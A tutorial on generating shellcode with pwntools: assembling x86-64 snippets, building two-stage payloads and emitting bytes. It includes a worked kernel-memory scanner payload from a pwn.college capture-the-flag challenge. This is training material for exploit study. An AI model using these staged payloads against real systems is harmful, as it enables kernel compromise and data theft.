# Python ASM Generation

Use pwntools to write assembly as a Python string, assemble it into bytes, and then place those bytes into an exploit payload.

## Install and setup

```bash
python3 -m pip install --user pwntools
```

```python
from pwn import *

context.arch = "amd64"
context.os = "linux"
```

`context.arch` is important: it controls instruction encoding and register names. Common values are `amd64`, `i386`, `arm`, and `aarch64`.

## Assemble a small snippet

```python
from pwn import *

context.arch = "amd64"

shellcode = asm("""
    mov eax, 1          /* SYS_write */
    mov edi, 1          /* stdout */
    mov rsi, 0x31337000
    mov edx, 0x20
    syscall
    ret
""")

print(disasm(shellcode))
print(shellcode.hex())
```

`asm()` returns a Python `bytes` object. Use `disasm()` whenever possible to verify that the generated bytes match the intended instructions.

## Use Python constants in assembly

Format constants into the assembly string with `:#x` so they are emitted as hexadecimal literals:

```python
MAP = 0x31337000
OUT = MAP + 0x200

user = asm(f"""
    mov eax, 1
    mov edi, 1
    mov esi, {OUT:#x}
    mov edx, 0x100
    syscall
    ret
""")
```

This is preferable to manually calculating instruction bytes.

## Multi-stage shellcode

For a staged exploit, assemble each stage separately. The first stage can use a syscall to send the second stage somewhere useful:

```python
MAP = 0x31337000
KERNEL_OFF = 0x40

kernel = asm(f"""
    /* kernel stage */
    mov rax, 0
    ret
""")

user = asm(f"""
    /* write(3, MAP + KERNEL_OFF, len(kernel)) */
    mov eax, 1
    mov edi, 3
    mov esi, {MAP + KERNEL_OFF:#x}
    mov edx, {len(kernel)}
    syscall
    ret
""")

assert len(user) <= KERNEL_OFF
payload = user.ljust(KERNEL_OFF, b"\x00") + kernel
```

The assertion prevents the first stage from overwriting the location where the second stage is expected to begin.

## Labels and relative addresses

Let the assembler resolve local labels instead of hardcoding jump offsets:

```python
kernel = asm(f"""
    mov rdi, {DIRECT_MAP_START:#x}

top:
    cmp qword ptr [rdi], 0
    je done
    inc rdi
    jmp top

done:
    ret
""")
```

For data embedded in the same shellcode, use RIP-relative addressing:

```python
kernel = asm("""
    lea rbx, [rip + marker]
    mov rbx, [rbx]
    ret

marker:
    .string "pwn.college"
""")
```

The label is assembled relative to the current instruction, so this remains position-independent when the shellcode is copied elsewhere.

## Example: direct-map scanner

This is the pattern used in the pwn.college kernel level 12 challenge:

```python
from pwn import *

context.arch = "amd64"

MAP = 0x31337000
KERNEL_OFF = 0x40
DIRECT_MAP_START = 0xffff888070000000
PRINTK = 0xffffffff810b69a9

kernel = asm(f"""
    mov rdi, {DIRECT_MAP_START:#x}
    mov rax, {PRINTK:#x}

    lea rbx, [rip + marker]
    mov rbx, [rbx]

top:
    cmp rbx, [rdi]
    je found
    inc rdi
    jmp top

found:
    push rax
    push rdi
    call rax
    pop rdi
    pop rax
    inc rdi
    jmp top

marker:
    .string "pwn.college"
""")

user = asm(f"""
    /* write(3, MAP + KERNEL_OFF, 0xffff) */
    mov eax, 1
    mov edi, 3
    mov esi, {MAP + KERNEL_OFF:#x}
    mov edx, 0xffff
    syscall
    ret
""")

assert len(user) <= KERNEL_OFF
payload = user.ljust(KERNEL_OFF, b"\x00") + kernel
payload = payload.ljust(0x1000, b"\x00")
```

The constants are challenge-specific. Kernel function addresses and direct-map addresses must be verified for the target VM.

## Generate a C byte string

To paste the assembled payload into a C solver:

```python
print("".join(f"\\x{byte:02x}" for byte in payload))
```

Then use the output as a C string:

```c
char buf[] =
    "\xb8\x01\x00\x00\x00"
    "\xbf\x03\x00\x00\x00";
write(fd, buf, sizeof(buf));
```

Alternatively, write raw bytes to a file or stdout:

```python
with open("payload.bin", "wb") as f:
    f.write(payload)
```

## Verify the result

Useful checks:

```python
print(f"user length:   {len(user):#x}")
print(f"kernel length: {len(kernel):#x}")
print(disasm(user))
print(disasm(kernel))
```

From the shell:

```bash
python3 solve.py > payload.txt
python3 -c 'import codecs,sys; sys.stdout.buffer.write(codecs.decode(open("payload.txt").read().strip(), "unicode_escape").encode("latin1"))' > payload.bin
objdump -D -b binary -m i386:x86-64 payload.bin
```

## Common mistakes

- Forgetting `context.arch = "amd64"`.
- Using `mov esi, address` when the address does not fit in 32 bits. Use `mov rsi, address` for a full 64-bit address.
- Forgetting that `syscall` clobbers `rcx` and `r11`.
- Placing stage 2 before the first stage finishes writing it.
- Using absolute pointers when RIP-relative labels would make the shellcode position-independent.
- Confusing an assembly source string with assembled bytes: call `asm()` before using it as a payload.
- Not disassembling the final bytes. Always check the generated payload, especially after changing padding or offsets.
